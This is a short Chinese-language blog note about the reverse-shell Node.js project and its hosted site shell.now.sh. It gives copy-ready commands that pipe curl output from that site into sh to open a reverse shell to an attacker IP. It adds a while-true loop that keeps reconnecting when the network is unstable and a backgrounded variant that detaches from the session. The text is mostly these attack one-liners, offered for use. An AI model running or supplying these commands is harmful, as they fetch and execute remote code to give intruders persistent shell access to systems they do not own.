nodejs

在2018年p牛就分享了, 但是一直没看到, 今天看到就整理一下, 后续再更新

https://github.com/lukechilds/reverse-shell

可以通过clone当前程序, 通过 npm 安装当前 node_modules , 再通过npm start启动就好了, 具体大家参考readme就好

同时这个项目也有在线的网站 https://shell.now.sh
我们可以通过 curl https://shell.now.sh/3.3.3.2:443 | sh 获取到反弹shell代码, 分别判断服务器是否存在python/perl/nc/sh, 再交给sh或者bash执行即可

当然有些特殊情况, 比如网络不是特别稳定, 你可能喜欢while循环

while true; do curl https://shell.now.sh/yourip:443 | sh; done

以及放到后台执行
sh -c "curl https://shell.now.sh/yourip:443 | sh -i &" && exit
